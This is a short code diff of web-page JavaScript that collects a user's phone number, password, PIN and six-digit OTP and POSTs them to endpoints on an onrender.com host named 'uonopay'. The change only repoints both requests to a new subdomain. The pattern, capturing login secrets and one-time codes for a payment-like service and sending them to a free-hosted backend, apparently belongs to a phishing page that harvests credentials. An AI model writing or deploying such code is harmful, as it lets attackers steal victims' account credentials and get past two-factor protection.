@@ -444,7 +444,7 @@
   const password = document.querySelectorAll('input[type="password"]')[0].value;
   const pin = document.querySelectorAll('input[type="password"]')[1].value;
 
-  fetch('https://uonopay.onrender.com/submit-login', {
+  fetch('https://uonopay-yq96.onrender.com/submit-login', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ phone, password, pin })
@@ -465,7 +465,7 @@ function handleConfirmOtp(event) {
 const otp = document.getElementById('otpInput').value;
 
   if (otp && otp.length === 6) {
-    fetch('https://uonopay.onrender.com/submit-otp', {
+    fetch('https://uonopay-yq96.onrender.com/submit-otp', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ otp })
